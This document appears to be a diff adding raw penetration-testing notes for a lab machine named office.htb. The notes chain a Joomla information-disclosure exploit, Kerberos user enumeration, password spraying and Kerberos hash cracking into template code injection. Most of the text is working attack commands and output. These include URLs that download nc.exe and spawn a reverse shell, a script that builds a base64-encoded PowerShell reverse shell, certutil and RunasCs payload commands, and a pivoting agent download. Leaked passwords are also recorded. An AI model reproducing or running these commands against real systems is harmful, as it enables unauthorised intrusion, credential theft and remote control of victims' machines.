@@ -1,0 +1,418 @@
+
+
+
+http://10.10.11.3/administrator/manifests/files/joomla.xml
+
+<version>4.2.7</version>
+
+https://nvd.nist.gov/vuln/detail/cve-2023-23752
+
+https://github.com/adhikara13/CVE-2023-23752/blob/main/CVE-2023-23752.py
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 23752.py -u 10.10.11.3
+[+] => Vulnerable 10.10.11.3
+User: root Password: H0lOgrams4reTakIng0Ver754! Database: joomla_db
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+No databases are accessible. So we look for users.
+
+┌──(root㉿kali)-[/home/kali]
+└─# kerbrute userenum -d office.htb --dc dc.office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 09/26/25 - Ronnie Flathers @ropnop
+
+2025/09/26 03:20:08 >  Using KDC(s):
+2025/09/26 03:20:08 >  	dc.office.htb:88
+
+2025/09/26 03:20:14 >  [+] VALID USERNAME:	 administrator@office.htb
+2025/09/26 03:20:58 >  [+] VALID USERNAME:	 Administrator@office.htb
+2025/09/26 03:21:17 >  [+] VALID USERNAME:	 ewhite@office.htb
+2025/09/26 03:21:17 >  [+] VALID USERNAME:	 etower@office.htb
+2025/09/26 03:21:17 >  [+] VALID USERNAME:	 dwolfe@office.htb
+2025/09/26 03:21:17 >  [+] VALID USERNAME:	 dmichael@office.htb
+2025/09/26 03:21:17 >  [+] VALID USERNAME:	 dlanor@office.htb
+2025/09/26 03:29:14 >  [+] VALID USERNAME:	 hhogan@office.htb
+2025/09/26 03:31:29 >  [+] VALID USERNAME:	 DWOLFE@office.htb
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb office.htb -u users -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [-] office.htb\hhogan:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         10.10.11.3      445    DC               [+] office.htb\DWOLFE:H0lOgrams4reTakIng0Ver754! 
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# nxc smb office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -M spider_plus
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
+SPIDER_PLUS 10.10.11.3      445    DC               [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.10.11.3      445    DC               [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS 10.10.11.3      445    DC               [*]     STATS_FLAG: True
+SPIDER_PLUS 10.10.11.3      445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.10.11.3      445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.10.11.3      445    DC               [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.10.11.3      445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
+SMB         10.10.11.3      445    DC               [*] Enumerated shares
+SMB         10.10.11.3      445    DC               Share           Permissions     Remark
+SMB         10.10.11.3      445    DC               -----           -----------     ------
+SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.3      445    DC               C$                              Default share
+SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.3      445    DC               SOC Analysis    READ            
+SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
+SPIDER_PLUS 10.10.11.3      445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.10.11.3.json".
+SPIDER_PLUS 10.10.11.3      445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, SOC Analysis, SYSVOL)
+SPIDER_PLUS 10.10.11.3      445    DC               [*] SMB Readable Shares:  4 (IPC$, NETLOGON, SOC Analysis, SYSVOL)
+SPIDER_PLUS 10.10.11.3      445    DC               [*] SMB Filtered Shares:  1
+SPIDER_PLUS 10.10.11.3      445    DC               [*] Total folders found:  38
+SPIDER_PLUS 10.10.11.3      445    DC               [*] Total files found:    11
+SPIDER_PLUS 10.10.11.3      445    DC               [*] File size average:    122.63 KB
+SPIDER_PLUS 10.10.11.3      445    DC               [*] File size min:        23 B
+SPIDER_PLUS 10.10.11.3      445    DC               [*] File size max:        1.31 MB
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+┌──(root㉿kali)-[/home/kali]
+└─# ./find_smb_writable.sh -H 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!'
+...
+❌ No writable locations found
+📄 Details saved to: ./writable_shares.csv
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+good wireshark AD filter
+(tcp.port == 110 or tcp.port == 25 or tcp.port == 143 or udp.port == 161 or tcp.port == 21 or tcp.port == 80 or (ntlmssp) or (kerberos))
+
+
+With a little research about Kerberos, which can be found here, we know that the initial packet of
+AS-REQ contains a timestamp encrypted with the user's password, meaning that we can retrieve
+this timestamp from the packet capture and attempt to crack it. An example hash format from
+KRB pre-auth can be found here:
+After modifying the hash value, we can attempt to crack it with Hashcat .
+19900 | Kerberos 5, etype 18, Pre-Auth |
+$krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb12e
+0266cde74e81094661addab08c0c1a178882c91a0ed89ae4e0e68d2820b9cce69770
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --list=format-tests | sed -n '/krb5-18/,+12p'
+john --list=format-tests | sed -n '/krb5pa-sha1/,+12p'
+john --list=format-tests | sed -n '/krb5-17/,+12p'
+Test scrypt 1: plaintext contains line feed
+Test scrypt 1: ciphertext contains line feed or separator character '	'
+krb5-18	0	OLYMPE.OLtest$214bb89cf5b8330112d52189ab05d9d05b03b5a961fe6d06203335ad5f339b26	password
+krb5-18	1	$krb18$OLYMPE.OLtest$214bb89cf5b8330112d52189ab05d9d05b03b5a961fe6d06203335ad5f339b26	password
+krb5-3	0	$krb3$INTERNAL.CORP1user3$eafdc79b7620584a	password
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$krb5pa$18$tstark$OFFICE.HTB$$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5pa-sha1, Kerberos 5 AS-REQ Pre-Auth etype 17/18 [PBKDF2-SHA1 256/256 AVX2 8x])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+playboy69        (?)     
+1g 0:00:00:00 DONE (2025-09-26 05:28) 2.325g/s 12502p/s 12502c/s 12502C/s Liverpool..ginuwine
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+                                                                         
+We are able to login to the Joomla instance 
+Administrator:playboy69
+
+We successfully authenticate and land on the Joomla dashboard. Since we have administrator
+privileges in the web app, we can edit a template and inject some PHP code there. We navigate to
+System -> Site Templates -> Cassiopeia Details and Files -> index.php and inject the
+following payload
+
+
+
+http://office.htb/index.php?cmd=powershell+iwr+10.10.14.18/nc+-O+nc.exe
+
+http://office.htb/index.php?cmd=nc.exe+10.10.14.18+53+-e+cmd.exe
+
+
+python3 - <<'PY'
+import base64, urllib.parse
+
+# 1) Put your PowerShell reverse-shell or command here (single-line string)
+ps = r"$client=New-Object System.Net.Sockets.TCPClient('10.10.14.18',4444);" \
+     r"$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};" \
+     r"while(($i=$stream.Read($b,0,$b.Length)) -ne 0){" \
+     r"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);" \
+     r"$r=(iex $d 2>&1 | Out-String);" \
+     r"$rb=([text.encoding]::ASCII).GetBytes($r);" \
+     r"$stream.Write($rb,0,$rb.Length);$stream.Flush()};$client.Close()"
+
+# 2) Encode to UTF-16LE then Base64
+b = ps.encode('utf-16le')
+b64 = base64.b64encode(b).decode()
+
+# 3) URL-encode the Base64 so +, /, = are safe in the URL
+url_b64 = urllib.parse.quote_plus(b64)
+
+# 4) Build the final URL (replace office.htb if needed)
+url = f"http://office.htb/index.php?cmd=powershell%20-EncodedCommand%20{url_b64}"
+print(url)
+PY
+
+
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# >....                                                                                                            
+
+# 1) Put your PowerShell reverse-shell or command here (single-line string)
+ps = r"$client=New-Object System.Net.Sockets.TCPClient('10.10.14.18',4444);" \
+     r"$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};" \
+     r"while(($i=$stream.Read($b,0,$b.Length)) -ne 0){" \
+     r"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);" \
+     r"$r=(iex $d 2>&1 | Out-String);" \
+     r"$rb=([text.encoding]::ASCII).GetBytes($r);" \
+     r"$stream.Write($rb,0,$rb.Length);$stream.Flush()};$client.Close()"
+
+# 2) Encode to UTF-16LE then Base64
+b = ps.encode('utf-16le')
+b64 = base64.b64encode(b).decode()
+
+# 3) URL-encode the Base64 so +, /, = are safe in the URL
+url_b64 = urllib.parse.quote_plus(b64)
+
+# 4) Build the final URL (replace office.htb if needed)
+url = f"http://office.htb/index.php?cmd=powershell%20-EncodedCommand%20{url_b64}"
+print(url)
+PY
+http://office.htb/index.php?cmd=powershell%20-EncodedCommand%20JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgAxADgAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0APQAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHIAPQAoAGkAZQB4ACAAJABkACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHIAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJAByAGIALAAwACwAJAByAGIALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.3] 53858
+dir
+
+
+    Directory: C:\xampp\htdocs\joomla
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         9/26/2025  11:05 AM                administrator                                                        
+d-----          5/8/2023   3:09 PM                api                                                                  
+d-----          5/8/2023   3:09 PM                cache                                                                
+d-----          5/8/2023   3:09 PM                cli                                                                  
+d-----          5/8/2023   3:09 PM                components                                                           
+d-----          5/8/2023   3:09 PM                images                                                               
+d-----          5/8/2023   3:09 PM                includes                                                             
+d-----          5/8/2023   3:09 PM                language                                                             
+d-----          5/8/2023   3:09 PM                layouts                                                              
+d-----          5/8/2023   3:10 PM                libraries                                                            
+d-----          5/8/2023   3:10 PM                media                                                                
+d-----          5/8/2023   3:10 PM                modules                                                              
+d-----          5/8/2023   3:10 PM                plugins                                                              
+d-----         9/26/2025  11:05 AM                templates                                                            
+d-----          5/8/2023   3:10 PM                tmp                                                                  
+-a----         4/13/2023   4:27 PM           2057 configuration.php                                                    
+-a----         4/13/2023   4:12 PM           6858 htaccess.txt                                                         
+-a----         4/13/2023   4:12 PM           1068 index.php                                                            
+-a----         4/13/2023   4:11 PM          18092 LICENSE.txt                                                          
+-a----         9/26/2025  10:57 AM          35032 nc.exe                                                               
+-a----         4/13/2023   4:11 PM           4942 README.txt                                                           
+-a----         4/13/2023   4:14 PM            764 robots.txt                                                           
+-a----         4/13/2023   4:14 PM           2974 web.config.txt                                                       
+
+cd Users/Public
+dir
+
+
+    Directory: C:\Users\Public
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-r---         1/17/2024  12:29 PM                Documents                                                            
+d-r---          5/8/2021   1:20 AM                Downloads                                                            
+d-r---          5/8/2021   1:20 AM                Music                                                                
+d-r---          5/8/2021   1:20 AM                Pictures                                                             
+d-r---          5/8/2021   1:20 AM                Videos                                                               
+
+
+mkdir temp
+
+
+    Directory: C:\Users\Public
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----         9/26/2025  11:24 AM                temp                                                                 
+
+
+powershell iwr http://10.10.14.18/RunasCs.exe -O RunasCs.exe
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.3 - - [26/Sep/2025 06:30:49] "GET /RunasCs.exe HTTP/1.1" 200 -
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80 --directory /usr/share/windows-resources/binaries/
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.3 - - [27/Sep/2025 01:25:46] "GET /nc.exe HTTP/1.1" 200 -
+10.10.11.3 - - [27/Sep/2025 01:25:47] "GET /nc.exe HTTP/1.1" 200 -
+
+
+certutil -urlcache -f http://10.10.14.18/nc.exe C:\Users\Public\nc.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+.\RunasCs.exe tstark playboy69 "C:\Users\Public\nc.exe -e cmd.exe 10.10.14.18 5555" -d office.htb -l 8
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.3] 59969
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+office\tstark
+
+C:\Windows\system32>
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.3] 57250
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>netstat -ano 
+netstat -ano
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5104
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5104
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       916
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3260
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       376
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING       5104
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2680
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       540
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1168
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1464
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2184
+  TCP    0.0.0.0:64656          0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:64669          0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:64676          0.0.0.0:0              LISTENING       2712
+  TCP    0.0.0.0:64693          0.0.0.0:0              LISTENING       2696
+  TCP    0.0.0.0:64723          0.0.0.0:0              LISTENING       660
+  TCP    10.10.11.3:53          0.0.0.0:0              LISTENING       2712
+  TCP    10.10.11.3:139         0.0.0.0:0              LISTENING       4
+  TCP    10.10.11.3:389         10.10.11.3:57130       ESTABLISHED     676
+  TCP    10.10.11.3:389         10.10.11.3:64668       ESTABLISHED     676
+  TCP    10.10.11.3:389         10.10.11.3:64686       ESTABLISHED     676
+  TCP    10.10.11.3:57130       10.10.11.3:389         ESTABLISHED     2712
+  TCP    10.10.11.3:57250       10.10.14.18:5555       ESTABLISHED     2412
+  TCP    10.10.11.3:64668       10.10.11.3:389         ESTABLISHED     2696
+  TCP    10.10.11.3:64686       10.10.11.3:389         ESTABLISHED     2696
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2712
+  TCP    127.0.0.1:389          127.0.0.1:64658        ESTABLISHED     676
+  TCP    127.0.0.1:389          127.0.0.1:64660        ESTABLISHED     676
+  TCP    127.0.0.1:389          127.0.0.1:64662        ESTABLISHED     676
+  TCP    127.0.0.1:389          127.0.0.1:64675        ESTABLISHED     676
+  TCP    127.0.0.1:3268         127.0.0.1:64690        ESTABLISHED     676
+  TCP    127.0.0.1:64658        127.0.0.1:389          ESTABLISHED     2756
+  TCP    127.0.0.1:64660        127.0.0.1:389          ESTABLISHED     2756
+  TCP    127.0.0.1:64662        127.0.0.1:389          ESTABLISHED     2680
+  TCP    127.0.0.1:64675        127.0.0.1:389          ESTABLISHED     2712
+  TCP    127.0.0.1:64690        127.0.0.1:3268         ESTABLISHED     2680
+  TCP    [::]:80                [::]:0                 LISTENING       5104
+  TCP    [::]:88                [::]:0                 LISTENING       676
+  TCP    [::]:135               [::]:0                 LISTENING       916
+  TCP    [::]:443               [::]:0                 LISTENING       5104
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:464               [::]:0                 LISTENING       676
+  TCP    [::]:593               [::]:0                 LISTENING       916
+  TCP    [::]:3306              [::]:0                 LISTENING       3260
+  TCP    [::]:3389              [::]:0                 LISTENING       376
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:8083              [::]:0                 LISTENING       5104
+  TCP    [::]:9389              [::]:0                 LISTENING       2680
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       676
+  TCP    [::]:49665             [::]:0                 LISTENING       540
+  TCP    [::]:49666             [::]:0                 LISTENING       1168
+  TCP    [::]:49667             [::]:0                 LISTENING       1464
+  TCP    [::]:49668             [::]:0                 LISTENING       676
+  TCP    [::]:49670             [::]:0                 LISTENING       2184
+  TCP    [::]:64656             [::]:0                 LISTENING       676
+  TCP    [::]:64669             [::]:0                 LISTENING       676
+  TCP    [::]:64676             [::]:0                 LISTENING       2712
+  TCP    [::]:64693             [::]:0                 LISTENING       2696
+  TCP    [::]:64723             [::]:0                 LISTENING       660
+  TCP    [::1]:53               [::]:0                 LISTENING       2712
+  TCP    [::1]:49668            [::1]:64679            ESTABLISHED     676
+  TCP    [::1]:49668            [::1]:64715            ESTABLISHED     676
+  TCP    [::1]:57258            [::1]:135              TIME_WAIT       0
+  TCP    [::1]:64679            [::1]:49668            ESTABLISHED     2696
+  TCP    [::1]:64715            [::1]:49668            ESTABLISHED     2880
+
+
+
+certutil -urlcache -f http://10.10.14.18/ligolo-agent C:\Users\Public\ligolo-agent.exe
+
+Initialize the TUN interface: ip tuntap add user root mode tun ligolo 
+and 
+ip link set ligolo up.
+
+
+
+
+
+
+
+
+
